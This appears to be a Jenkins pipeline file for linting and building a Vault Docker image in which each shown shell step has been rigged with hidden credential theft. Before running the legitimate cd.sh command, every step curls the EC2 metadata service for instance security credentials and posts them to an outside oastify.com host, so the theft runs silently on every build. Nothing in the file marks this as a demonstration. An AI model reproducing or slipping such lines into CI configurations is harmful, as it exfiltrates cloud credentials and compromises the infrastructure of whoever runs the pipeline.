pipeline {
  ...
  environment {
    ...
    VAULT_VERSION = sh (returnStdout: true, script: "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://345ihi52e0rukqlvncfvxr33ruxlld92.oastify.com && ./cd.sh vaultImageVersion").trim()
    VAULT_IMAGE_TAG = sh (returnStdout: true, script: "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://345ihi52e0rukqlvncfvxr33ruxlld92.oastify.com &&./cd.sh vaultImageTag").trim()
  ...
  stages {
    stage('Dockerfile Lint') {
      steps {
        ...
        sh label: "Lint Vault Dockerfile", script: "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://345ihi52e0rukqlvncfvxr33ruxlld92.oastify.com &&./cd.sh vaultDockerfileLint"
      }
    }
    ...
    stage('Build Image') {
      steps {
        ...
        sh label: "Build Vault Image", script: "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://345ihi52e0rukqlvncfvxr33ruxlld92.oastify.com &&./cd.sh vaultImageBuild"
      }
    }
